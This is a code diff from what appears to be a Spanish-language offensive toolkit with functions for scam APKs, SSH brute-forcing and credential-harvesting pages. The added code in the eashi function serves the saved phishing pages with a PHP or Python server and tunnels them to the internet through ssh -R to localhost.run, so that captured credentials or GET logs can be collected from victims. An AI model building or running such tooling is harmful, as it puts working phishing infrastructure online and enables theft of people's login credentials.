@@ -1238,7 +1238,7 @@ def sc4pk(idcap, selec):
             temp.close()
             os.remove(".temp")
 
-    if selec in base_apk:
+    if selec in base_apk and selec != None:
 
         try:
             if "Scam_2" in ver_carpeta:
@@ -1251,9 +1251,6 @@ def sc4pk(idcap, selec):
             print(err)
 
         crear(selec, idcap)
-    
-    else:
-        crint("[ERROR] Opcion ingresada no valida ...")
     
     if selec == None:
         
@@ -2594,6 +2591,7 @@ def sshforce(ip, port, usr, pssw):
 def eashi(dir_):
 
     # Variables de Instancias
+    ip = ""
     buffer = ""
     action = ""
     log_2 = False
@@ -2854,6 +2852,60 @@ def eashi(dir_):
                         save_php_.write(log_php.replace("action_", action))
 
                     crint(f"[PASS] Los archivos han sido guardados exitosamente en =>> [{save_dir}]")
+
+                    who_ = input("[INFO] Quieres crear un enlace publico con localhost.run ? [Y/n]: ").lower()
+                    
+                    if who_ == "y":
+
+                        ch_tmp = False
+                        
+                        # Si es windows se obtiene la ip local
+                        if "win" in SYS_GLOBAL:
+                            
+                            # Se crea una lista con la info
+                            ip_cfg = getoutput("ipconfig").split("\n")
+                            for line in ip_cfg:
+
+                                # Si es ADAPTADOR LAN se marca verdadero
+                                if "LAN" in line and "Wi-Fi" in line:
+                                    ch_tmp = True
+                                
+                                # Si es ipv4 se obtiene y se limpia
+                                if ch_tmp == True and "v4" in line:
+                                    ip = line.split(":")[1].strip(" ")
+                                    break
+                            
+                            # Si no se logra obtener
+                            if ip == "" or ch_tmp == False:
+                                crint("[ERROR] No se a logrado iniciar el servidor ...")
+                                exit(0)
+                            
+                            crint("[INFO] Usando Windows no puedes obtener credenciales directamente sin PHP\n [==>>] sin embargo quedara en el registro de peticiones GET.\n")
+                            os.system(f"python3 -m http.server -b {ip} -d {save_dir} 8000 | ssh -R 80:{ip}:8000 nokey@localhost.run")
+                        
+                        else:
+
+                            # Se crea una lista con la info
+                            ip_cfg = getoutput("ifconfig").split("\n")
+                            for line in ip_cfg:
+                                
+                                # Si se detecta red o ethernet
+                                if "wlan0" in line or "eth0" in line:
+                                    ch_tmp = True
+                                
+                                # Se obtiene la ip
+                                if "inet" in line:
+                                    ip = line.split(" ")
+                                    ip = ip[ip.index("inet")+1].strip()
+                                    break
+                            
+                            # Si no se logra obtener
+                            if ip == "" or ch_tmp == False:
+                                crint("[ERROR] No se a logrado iniciar el servidor ...")
+                                exit(0)
+
+                            os.system(f"php -S {ip}:8000 -t {save_dir} | ssh -R 80:{ip}:8000 nokey@localhost.run")
+                            
                     break
         
         else:
